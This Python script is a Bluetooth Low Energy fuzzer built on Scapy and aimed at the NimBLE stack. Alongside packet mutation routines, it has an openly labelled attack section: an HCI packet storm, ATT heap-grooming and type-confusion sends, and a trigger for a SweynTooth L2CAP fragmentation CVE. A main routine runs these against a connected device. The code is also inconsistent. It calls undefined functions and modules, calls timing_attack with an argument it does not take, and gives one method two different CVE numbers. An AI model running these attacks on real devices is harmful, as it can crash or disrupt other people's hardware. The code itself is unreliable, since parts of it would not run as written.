from scapy.all import *
from scapy.layers.bluetooth import *
from scapy.layers.bluetooth4LE import *
from nimble_connector import NimBLEConnectionManager
import os
import struct
import time
import random
from exploits.bleedingtooth import BleedingTooth

class NimBLEFuzzer(NimBLEConnectionManager):
    def __init__(self, adapter=0, role='central'):
        super().__init__(adapter, role) 
        self.sniffing = False
        self.crash_signatures = []
        self.rng = random.Random()
        self.mutation_history = []

    def generate_dynamic_payload(self, base_size: int, entropy_source: str = 'random') -> bytes:
        """Generate dynamic payload with different entropy sources"""
        if entropy_source == 'random':
            return bytes(self.rng.randint(0, 255) for _ in range(base_size))
        elif entropy_source == 'sequential':
            return bytes(range(base_size))
        elif entropy_source == 'pattern':
            # Generate repeating patterns that might trigger parsing errors
            pattern = bytes([0xA5, 0x5A, 0xFF, 0x00])
            return (pattern * (base_size // len(pattern) + 1))[:base_size]
        
    def mutate_length(self, base_length: int) -> int:
        """Smart length mutation targeting boundary conditions"""
        boundary_cases = [
            0,
            1,
            base_length - 1,
            base_length + 1,
            0xFF,
            0x100,
            0x1000,
            0xFFFF
        ]
        return self.rng.choice(boundary_cases)
        
    def mutate_payload(self, payload: bytes, mutation_rate: float = 0.1) -> bytes:
        """Mutate existing payload with various strategies"""
        mutated = bytearray(payload)
        length = len(mutated)
        
        # Apply different mutation strategies
        if self.rng.random() < mutation_rate:
            strategy = self.rng.choice([
                'bit_flip',
                'byte_flip',
                'byte_inc',
                'byte_dec',
                'block_repeat',
                'block_remove'
            ])
            
            if strategy == 'bit_flip':
                pos = self.rng.randrange(length)
                bit = self.rng.randrange(8)
                mutated[pos] ^= (1 << bit)
                
            elif strategy == 'byte_flip':
                pos = self.rng.randrange(length)
                mutated[pos] ^= 0xFF
                
            elif strategy == 'byte_inc':
                pos = self.rng.randrange(length)
                mutated[pos] = (mutated[pos] + 1) & 0xFF
                
            elif strategy == 'byte_dec':
                pos = self.rng.randrange(length)
                mutated[pos] = (mutated[pos] - 1) & 0xFF
                
            elif strategy == 'block_repeat':
                if length > 2:
                    pos = self.rng.randrange(length - 2)
                    block = mutated[pos:pos + 2]
                    mutated[pos:pos + 2] = block * 2
                    
            elif strategy == 'block_remove':
                if length > 2:
                    pos = self.rng.randrange(length - 2)
                    del mutated[pos:pos + 2]
                    
        # Track mutation for reproducibility
        mutation_hash = hashlib.sha256(mutated).hexdigest()[:16]
        self.mutation_history.append(mutation_hash)
        
        return bytes(mutated)

    def _start_sniffer(self):
        """Background packet capture for crash detection"""
        def _sniff_callback(pkt):
            if BTLE in pkt:
                self.response_log.append(pkt.summary())
        self.sniffing = True
        AsyncSniffer(iface=self.socket.iface, prn=_sniff_callback, store=False).start()

    def _detect_crash(self, conn):
        """Check for post-exploitation state"""
        try:
            # Send valid ATT request
            self.att_send_raw(conn, ATT_Read_Request(gatt_handle=0x0001))
            if not self.socket.recv(timeout=1):
                return True  # Target unresponsive
        except Exception as e:
            return True
        return False
    
########
# fuzzing
########
        
    def fuzz_link_layer(self, conn):
        """Fuzz link layer packets with selective CRC/whitening bypass."""
        access_addr = conn['access_addr']
        
        # Fuzzed LL control packet with CRC/whitening disabled
        fuzzed_ll = self.fuzz_packet(
            BTLE(access_addr=access_addr)/BTLE_DATA()/LL_CONNECTION_UPDATE_IND(
                win_size=15,
                timeout=100
            ),
            fuzz_fields={'win_size': random.randint(1, 255), 'timeout': random.randint(10, 500)}
        )
        self.ll_send_raw(fuzzed_ll, disable_crc=True, disable_whiten=True) 

    def fuzz_l2cap(self, conn):
        """Fuzz L2CAP layer packets."""
        # Fuzzed L2CAP CID
        bad_cid = int.from_bytes(os.urandom(2), 'big')
        l2cap_pkt = L2CAP_Hdr(cid=bad_cid)/os.urandom(30)
        self.l2cap_send_raw(conn, l2cap_pkt)
        
    def fuzz_att(self, conn):
        """Fuzz ATT layer packets."""
        # Fuzzed ATT Read Request
        fuzzed_att = self.fuzz_packet(
            ATT_Hdr()/ATT_Read_Request(gatt_handle=0x0001),
            fuzz_fields={'gatt_handle': random.randint(0x0001, 0xFFFF)}
        )
        self.att_send_raw(conn, fuzzed_att)

########
# ATTACKS
########
    def timing_attack(self):
        """Physical layer disruption patterns"""
        # Packet storm (1000 packets/sec)
        start = time.time()
        while time.time() - start < 5:  # 5-second burst
            pkt = (
                HCI_Hdr(type=0)/
                HCI_Command_Hdr(opcode=0xFD01)/  # Vendor-specific
                os.urandom(128)
            )
            self.send_hci_command(pkt)
            time.sleep(0.001)

    def att_handle_reaper(self, conn):
        """Advanced ATT handle fuzzing with memory probing"""
        # Heap grooming pattern
        for handle in range(0x0000, 0xFFFF, 0x100):
            pkt = ATT_Read_Request(gatt_handle=handle)
            self.socket.send(
                HCI_Hdr(type=2)/HCI_ACL_Hdr(handle=conn['handle'])/
                L2CAP_Hdr(cid=4)/pkt
            )
            time.sleep(0.001)
        
        # Type confusion attack
        for opcode in [0x08, 0x18, 0x28]:  # Write vs Signed Write
            self.socket.send(
                ATT_Hdr(opcode=opcode)/struct.pack('<HH', 
                    random.randint(0, 0xFFFF),  # Handle
                    random.randint(0, 0xFFFF)   # Value
                )
            )

    def sweyntooth_cve_2019_17519(self, conn):
        """Malformed L2CAP Continuation (CVE-2019-19195)"""
        print("[+] Triggering CVE-2019-19195 (L2CAP Fragmentation Attack) with dynamic payload generation")

        # Generate dynamic malformed L2CAP start fragment
        start_size = self.mutate_length(64)
        start_payload = self.generate_dynamic_payload(start_size, 'pattern')
        
        start_pkt = HCI_Hdr(type=2)/HCI_ACL_Hdr(
            handle=conn['handle'],
            PB=0x01  # Start fragment
        )/L2CAP_Hdr(cid=4, len=1024)/Raw(start_payload)
        
        # Follow with invalid continuation
        cont_pkt = HCI_Hdr(type=2)/HCI_ACL_Hdr(
            handle=conn['handle'],
            PB=0x00  # Continue fragment
        )/Raw(b'\xFF'*128)  # Invalid payload
        
        self.socket.send(start_pkt)
        time.sleep(0.1)
        self.socket.send(cont_pkt)


def main():
    peer_address = "AA:BB:CC:DD:EE:FF"
    
    with NimBLEFuzzer(adapter=0, role='central') as fuzzer:
        # Initialize and connect
        conn = fuzzer.init_connection(peer_address, "public")
        fuzzer.connect(conn)

        try: 
            # Run fuzzing procedures
            fuzzer.fuzz_link_layer(conn)
            time.sleep(0.5)
            fuzzer.fuzz_l2cap(conn)
            time.sleep(0.5)
            fuzzer.fuzz_att(conn)
            time.sleep(0.5)
            fuzzer.l2cap_fragmentation_attack(conn)
            time.sleep(0.5)
            fuzzer.att_handle_reaper(conn)
            time.sleep(0.5)
            fuzzer.timing_attack(conn)
        finally:
            fuzzer.disconnect(conn)

if __name__ == "__main__":
    main()